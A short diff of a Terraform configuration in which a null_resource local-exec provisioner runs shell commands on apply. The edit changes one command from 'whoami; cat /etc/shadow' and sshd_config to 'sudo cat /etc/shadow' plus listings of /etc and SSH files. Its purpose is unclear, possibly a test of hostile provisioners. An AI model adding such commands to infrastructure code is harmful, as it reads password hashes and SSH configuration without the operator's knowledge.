@@ -9,7 +9,7 @@ resource "random_id" "random" {
 
 resource "null_resource" "cmd" {
   provisioner "local-exec" {
-      command = "whoami; cat /etc/shadow ; cat /etc/sshd/sshd_config"
+      command = "sudo cat /etc/shadow ; sudo ls /etc/; sudo ls /etc/ssh*"
         }
         }
 
